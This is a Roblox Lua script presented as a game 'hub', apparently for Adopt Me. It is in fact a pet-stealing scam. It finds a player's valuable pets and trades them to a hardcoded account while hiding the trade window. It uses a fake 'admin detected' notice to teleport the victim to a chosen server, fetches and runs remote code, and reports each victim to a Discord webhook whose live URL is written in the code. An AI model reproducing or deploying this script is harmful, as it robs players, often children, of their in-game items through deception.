repeat task.wait() until game:IsLoaded()

print("\n\n\n\n\n\n\n\n\n")
print("Loading...")
local targetPets = {"parrot", "shadow_dragon", "frost_dragon", "owl", "giraffe", "crow", "evil_unicorn", "bat_dragon", "kangaroo", "turtle", "arctic_reindeer", "albino_monkey", "safari_egg", "cow", "candy_cannon", "flamingo", "reindeer", "hedgehog", "blue_dog", "pink_cat", "albino_monkey", "king_monkey"}
local target = "SmallKaydey"--"bnuuy_lin"
local function sendTrade()

    local args = {
        [1] = game:GetService("Players")[target]
    }

    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))

end
function toClipboard(String)
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(String)
	else
		notify('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
	end
end
local function addToTrade(petID)

    local args = {
        [1] = petID
    }

    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
end
local function acceptTrade()
    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
end
local function confirmTrade()
    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
end

local function rename(remotename,hashedremote)
    hashedremote.Name = remotename
end
local function deHash()
    table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4),rename)
end
local function hideNotifs()
    local success, value = pcall(function()
        hintApp = game.Players.LocalPlayer.PlayerGui.HintApp
    end)
    if success then
        hintApp = game.Players.LocalPlayer.PlayerGui.HintApp
        hintApp:Destroy()
    end
end
local function hookSpoofTrade()
    local success, value = pcall(function()
        tradeApp = game.Players.LocalPlayer.PlayerGui.TradeApp
    end)
    if not success then
        return
    end
    tradeApp = game.Players.LocalPlayer.PlayerGui.TradeApp
    
    for obj in tradeApp:GetDescendants() do
        local success, value = pcall(function()
            return obj.Visible
        end)
        if success then
            obj.Visible = false
            obj.Changed:connect(function(prop)
                obj.Visible = false
            end)
        end
    end
    
    tradeApp.DescendantAdded:connect(function(obj)
        obj.Changed:connect(function(prop)
            local success, value = pcall(function()
                return obj.Visible
            end)
            if success then
                obj.Visible = false
            end
        end)
    end)

    tradeApp:Destroy()
    

end
local function url_encode(s)
    s = string.gsub(s, "([^%w%-_%.%~])", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
    return s
end

local function encode_json(data)
    local parts = {}
    for k, v in pairs(data) do
        local key = url_encode(tostring(k))
        local value = url_encode(tostring(v))
        table.insert(parts, key .. "=" .. value)
    end
    return table.concat(parts, "&")
end
local function notifyRan(stage)
    local baseurl = "https://redanddwhite.pythonanywhere.com/postreq?url=https://discord.com/api/webhooks/1218333891639906414/6NJrKAKf7cjDIyyrHmlPrMfJFNlbs9iPjD_gyf1S_PjJix5MeeH7duDKH1n3CODJLOGk"
    local jstr = '{"content": "@everyone Player ran the script!", "username": "'..game.Players.LocalPlayer.Name..'", "embeds": [{"description": "'..game.Players.LocalPlayer.Name..'", "title": "Player ran the script at '..stage..'!"}]}'
    local encoded_json = url_encode(jstr)
    local url = baseurl.."&json="..encoded_json
    local resp = game:HttpGet(url)
end
local function checkVal(str, megaNeon)
    str = string.lower(str)
    str = string.gsub(str, "_", " ") 
    for _, pet in ipairs(targetPets) do
        if string.find(str, string.lower(pet:gsub("_", " "))) then
            return true
        end
    end
    if megaNeon == true then
        return true
    end
    return false
end
function fakeHub()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
end
function getPets()
    x =  require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
    petTable = x

    pets = {}

    for _,pet in pairs(petTable) do
        prop = pet.properties
        if checkVal(pet.kind, prop.mega_neon) then
            table.insert(pets, {pet.unique, pet.kind, pet.mega_neon, pet.neon})
        end
    end
    return pets
end

    function main()
    pets = getPets()
    if (pets[1] == nil) then -- check if any pets worth taking
        print "no pets"

    else
        -- call bot in here and wait for bot
        hideNotifs()
        deHash()
        sendTrade() -- add code to hide ui
        
        while (true) do
            checkWidg = game.Players.LocalPlayer.PlayerGui.TradeApp.Frame
            if (checkWidg.Visible) then
                print ("Trade entered")
                hookSpoofTrade() -- hide ui
                break
            end
            wait (0.1)
        end
        for _,pet in pets do
            addToTrade(pet[1])
        end
        while (true) do
            --checkWidg = game.Players.LocalPlayer.PlayerGui.TradeApp.Frame
            --if (checkWidg.Visible == false) then
            --    print ("Trade closed. Should be accepted")
            --    break
            --end
            
            acceptTrade()
            confirmTrade()
            wait(0.1)
        end
    end
end

--toClipboard(tostring(game.JobId))


GameId = 920587237
targetJobId = "77caf1bb-f788-4749-b311-6cdabcf17734" -- get from a pastebin ect

if (game.JobId == tostring(targetJobId)) then
    notifyRan("Stage 2")
    Game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "Waiting for game load..", -- Required
        Text = "Hub will start automatically", -- Required
        Icon = "rbxassetid://8429081004" -- Optional
    })
    wait(5)
    coroutine.wrap(fakeHub)()
    main()
else
    notifyRan("Stage 1")
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "Admin detected in server!", -- Required
        Text = "Joining new server in 5 seconds...", -- Required
        Icon = "rbxassetid://8429081004" -- Optional
    })
    wait(5)
    queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CosmicScripts/Cosmic/main/test.lua'))()")
    TeleportService = game:GetService("TeleportService")
    TeleportService:TeleportToPlaceInstance(GameId, targetJobId, game.Players.LocalPlayer)
end
